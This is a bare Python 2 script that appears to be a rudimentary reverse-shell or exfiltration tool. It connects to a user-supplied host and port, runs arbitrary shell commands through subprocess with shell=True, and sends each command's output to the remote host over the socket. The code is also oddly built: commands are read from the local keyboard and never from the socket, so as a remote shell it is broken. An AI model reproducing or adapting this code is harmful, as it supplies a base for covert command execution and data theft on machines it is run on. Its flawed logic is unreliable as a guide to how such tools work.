import getpass
import socket
import subprocess
username = getpass.getuser()
host=  raw_input("Enter host IP: ")
port = input ("Enter port: ")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	connect=s.connect_ex((host,port))
	if connect:
		print ("Unable to Establish connection")
	else:
		print("connection Established")
		while True:
			try:
				command=raw_input("Enter your command: ")
				proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
				result=proc.stdout.read() + proc.stderr.read()
				print (result)
				s.send(result)
			except Exception, err:
				print err
except Exception, exception:
	print exception
s.close()
